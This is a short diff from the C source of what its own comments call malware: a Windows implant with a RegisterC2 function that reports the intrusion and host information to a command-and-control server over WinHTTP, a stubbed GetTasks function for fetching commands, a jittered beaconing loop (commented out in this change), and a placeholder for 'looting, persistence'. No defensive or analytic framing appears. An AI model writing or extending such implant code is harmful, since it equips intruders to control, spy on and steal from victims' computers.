@@ -108,7 +108,7 @@ void ls(char* path){
     }
 }
 
-
+// Contact C2 and provide basic computer info
 void RegisterC2(){
 
     HINTERNET session = WinHttpOpen(
@@ -184,6 +184,7 @@ void RegisterC2(){
     WinHttpCloseHandle(session);
 }
 
+// Contact C2 and get commands to run
 wchar_t* GetTasks(){
 
 }
@@ -194,12 +195,12 @@ int _tmain(int argc, _TCHAR *argv[]){
         // Report intrusion to C2
         RegisterC2();
 
-        while(1){
+        /*while(1){
             wchar_t* tasks = GetTasks();
             
             int jitter = (rand() % 20) - 10;
             Sleep(30+jitter);
-        }
+        }*/
     }
 
     // Do malware things (investigation, looting, persistence)
